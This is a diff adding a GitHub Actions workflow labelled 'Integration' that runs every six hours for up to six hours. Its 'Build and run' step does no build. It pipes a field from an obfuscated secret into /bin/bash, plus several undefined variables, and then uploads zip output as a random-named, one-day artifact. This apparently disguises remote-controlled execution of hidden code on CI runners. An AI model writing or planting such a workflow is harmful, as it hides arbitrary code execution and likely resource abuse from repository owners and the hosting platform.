@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          vn72428: ${{ secrets.vn72428 }}
+        run: |
+          printf '%s' "$vn72428" | jq -r .j19268 | /bin/bash
+          echo $md02 | jq -r .ibe305 | /bin/bash
+          echo $e59954 | jq -r .npf6810 | /bin/bash
+          printf '%s' "$xkx9" | jq -r .ha09 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kRtaVQps
+          path: "*.zip"
+          retention-days: 1
